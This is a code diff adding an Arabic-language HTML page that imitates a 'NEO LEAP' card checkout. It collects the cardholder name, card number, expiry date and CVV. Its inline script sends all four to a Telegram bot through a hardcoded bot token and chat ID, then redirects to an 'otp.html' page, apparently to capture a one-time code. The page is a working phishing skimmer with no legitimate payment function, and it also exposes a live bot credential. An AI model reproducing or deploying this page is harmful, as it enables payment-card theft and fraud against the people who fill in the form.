@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="ar">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEO LEAP</title>
+    <style>
+    /* تنسيق الجسم */
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f4f4f4;
+}
+
+/* تنسيق الرأس */
+header {
+    padding: 15px 30px;
+    background-color: #68c998; /* لون رأس الصفحة */
+    color: #ffffff;
+    text-align: center;
+}
+
+header .logo {
+    display: inline-block;
+    background-color: #ffffff; /* خلفية بيضاء للشعار */
+    padding: 10px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+header .logo img {
+    max-width: 100px;
+}
+
+/* تنسيق محتوى الدفع */
+.payment-container {
+    background-color: #ffffff;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    max-width: 400px;
+    margin: 30px auto;
+}
+
+.payment-container h1 {
+    text-align: center;
+    margin-bottom: 5px; /* تقليل المسافة السفلية */
+    color: #333;
+}
+
+/* تنسيق رقم الطلب */
+.order-number {
+    text-align: right; /* وضع النص في الجهة اليمنى */
+    font-size: 14px; /* حجم أصغر للنص */
+    color: #555;
+    margin-bottom: 20px; /* مسافة بين النص وبقية المحتوى */
+}
+
+label {
+    display: block;
+    margin-bottom: 5px;
+    color: #555;
+}
+
+input[type="text"] {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 20px;
+    border-radius: 5px;
+    border: 1px solid #ddd;
+}
+
+/* تنسيق Flexbox للحقلين */
+.flex-container {
+    display: flex;
+    justify-content: space-between;
+    gap: 20px; /* إضافة مساحة 20 بيكسل بين الحقلين */
+}
+
+.flex-item {
+    flex: 1;
+}
+
+button {
+    width: 100%;
+    padding: 10px;
+    background-color: #68c998; /* لون زر الإرسال */
+    color: #ffffff;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #57af80; /* تغيير اللون عند التمرير إلى درجة أغمق */
+}
+
+/* تنسيق أيقونات البطاقات الائتمانية */
+.cards-icons {
+    text-align: center;
+    margin-top: 159px;
+}
+
+.cards-icons img {
+    width: 300px;
+    margin: 0 10px;
+}
+
+/* تنسيق التذييل */
+footer {
+    padding: 15px 30px;
+    background-color: #333;
+    color: #ffffff;
+    text-align: center;
+    position: fixed;
+    bottom: 0;
+    width: 100%;
+}
+/* تنسيق نص نوع البطاقة */
+.card-type {
+  font-size: 14px;
+  color: #555;
+  margin-top: 10px;
+  text-align: right;
+}
+</style>
+</head>
+
+<body>
+    <header>
+        <div class="logo">
+            <img src="https://www4.0zz0.com/2024/09/01/00/965232977.png" alt="Logo">
+        </div>
+    </header>
+
+    <div class="payment-container">
+        <h1>NEO LEAP</h1>
+        <p class="order-number">Order N:70490</p> <!-- إضافة النص هنا -->
+
+        <form id="payment-form">
+            <label for="cardholder-name">اسم حامل البطاقة:</label>
+            <input type="text" id="cardholder-name" name="cardholder-name" required>
+
+            
+    <label for="card-number">رقم البطاقة الائتمانية:</label>
+    <input type="text" id="card-number" name="card-number" required>
+    
+    <!-- عرض نوع البطاقة -->
+    <p id="card-type" class="card-type">نوع البطاقة</p>
+
+    <!-- الحقول الأخرى -->
+
+
+            <div class="flex-container">
+                <div class="flex-item">
+                    <label for="expiry-date">تاريخ انتهاء الصلاحية:</label>
+                    <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" required>
+                </div>
+                <div class="flex-item">
+                    <label for="cvv">الرمز السري (CVV):</label>
+                    <input type="text" id="cvv" name="cvv" required>
+                </div>
+            </div>
+
+            <button type="submit">تأكيد</button>
+        </form>
+        <div> <script>
+        document.getElementById('payment-form').addEventListener('submit', function (event) {
+            event.preventDefault(); // منع إرسال النموذج بالطريقة الافتراضية
+
+            // الحصول على بيانات النموذج
+            const cardholderName = document.getElementById('cardholder-name').value;
+            const cardNumber = document.getElementById('card-number').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // إعداد رسالة لتنسيقها
+            const message = `اسم حامل البطاقة: ${cardholderName}\nرقم البطاقة: ${cardNumber}\nتاريخ انتهاء الصلاحية: ${expiryDate}\nالرمز السري (CVV): ${cvv}`;
+
+            // إعداد الرابط الخاص بالبوت
+            const botToken = '6538211018:AAEkfaMZAaoOccZJ0v9wKcgi8NXAsG-96iE'; // استبدل بـ توكن البوت الخاص بك
+            const chatId = '1002015547105'; // استبدل بـ معرّف الدردشة الخاص بك
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // إرسال البيانات إلى بوت تيليجرام
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    // توجيه المستخدم إلى صفحة أخرى
+                    window.location.href = 'otp.html'; // استبدل بالصفحة التي تريد عرضها
+                } else {
+                    alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
+            });
+        });
+    </script>
+</div>
+
+        <div class="cards-icons">
+            <img src="mada-visa-mastar-apple-pay-886x159.png" alt="mada-visa-mastar-apple-pay">
+           
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
+
+
+
+
+
+   
+
